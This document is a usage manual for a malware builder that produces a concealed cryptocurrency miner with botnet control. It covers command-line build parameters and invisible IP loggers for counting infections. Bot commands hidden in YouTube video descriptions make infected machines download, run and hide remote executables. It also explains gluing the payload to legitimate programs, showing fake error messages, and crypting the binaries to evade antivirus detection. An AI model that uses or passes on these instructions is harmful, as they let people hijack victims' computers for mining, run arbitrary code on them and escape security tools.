Works through the console. Open cmd.exe, drag builder.exe into it and write parameters for build build via space.
Example:
builder.exe -crypt'' -pool'pool.com:3333' -wallet'123' -load'50' -loggerS'' -loggerR'' -loggerW'' -bot_a'' -bot_t'' -pucker'build' -ico'' -glue'' -error'' -worker''

-crypt "can be left blank. It will default on kryptonite v7. Or:
cryptonight     (v7)
cryptonight/0   (�������)
cryptonight/1
cryptonight/xtl
cryptonight/msr
cryptonight/xao
cryptonight/rto
cryptonight-lite
cryptonight-lite/0
cryptonight-lite/1
cryptonight-lite/ipbc
cryptonight-heavy
cryptonight-heavy/xhv
cryptonight-heavy/tube

-pool'' - here we enter the pool, or the proxy address

-wallet'' - your wallet. If you use a proxy, then you can not enter anything, or randomly

-load'' - the desired load:
50
75
100

-loggerS'' - start logger
-loggerR'' - logger for successful installation
-loggerW'' - logger for successful work
Create an "invisible logger" at https://iplogger.ru/, get the address "https://2no.co/16Sxt7", take 16Sxt7 and paste
Example. -loggerS'16Sxt7 'and in this logger the starts will be displayed

-bot_a'' - bot address
-bot_t'' - time for checking commands by the bot
Example. Download the video on YouTube, get the link https://www.youtube.com/watch?v=32LuSdijOsc and enter the bot-address -bot_a'32LuSdijOsc '
Then we put the check time on the team. Example 10 minutes - 1000 * 60 * 10. Example 5 minutes - 1000 * 60 * 5. An example of 20 minutes is 1000 * 60 * 20. -bot_t'1000 * 60 * 10 '
List of bot commands:
_download link - the bot downloads the file from the link and then deletes it in 10 seconds. If the file does not come out to be removed, it hides it.
_run link - similar to the top command, but after downloading it launches the downloaded file and hides it. Without deleting. (Checking the format of the link, loading only the correct link and files with the extension exe)
_rdel link - similar to the top two commands. But after starting the file it waits 20 seconds and deletes it after 20 seconds. If the file can not be deleted, it hides it. (check the format of the link, loads only on the correct link and files with the extension exe)
_update link - this command stops the mining and starts downloading the build update. After the download, the update is started, the bot is turned off and the assembly is updated. Therefore, all infected machines can be upgraded to a fresh build version. (only works when the correct format of the link and with the correct (exe) extension of the file)
_delete - cleans out all the "garbage" that remains or can remain after using the top commands. Recommended to use after working with the bot.

* Commands are entered in the description for the video. Not in the comments to the video, but in the description.
[Precautions] "Link" - in this place there should be a direct link to the downloadable file or to a new version of the assembly. (a straight line is when the download starts immediately, without any "download" buttons, etc.)


-pucker'' - assembly parameter
build - assembly will be from two files with protection from BT
build2 - the assembly will be one file
update - update build
Example. -pucker'build2 '

-ico'' is the name of the icon for the assembly. Applicable for build and build2
Example. We throw the necessary icon with the extension * .ico to the directory pucker \ ico \ and enter -ico'lala 'without extension

-glue'' is the name of the exe file to be glued to the assembly. Everything is the same with the icon. We throw in pucker \ glue \

-error'' is a fake error. If necessary, then we put here a random number

-worker'' - a random random name for every vorker. Those. each new vorker is assigned a random name, which will be permanent for him.
Similarly, with an error, if necessary, put a random number in this parameter.

del.bat - to remove the installed assembly

For more experienced users.
In the \pucker\ directory, editing the start.bat, start2.bat, and SystemCheck.xml files can change the installation directory and name.
Similarly, with new_update.bat, new_update2.bat, respectively, that is used in the assembly

You can try to crypt \mine32\start.exe and \mine64\start.exe, this will positively affect the build detection. (but not every cryptor is suitable, check work performance)
Also, the installer itself can try to crypt. (start.exe or run.exe)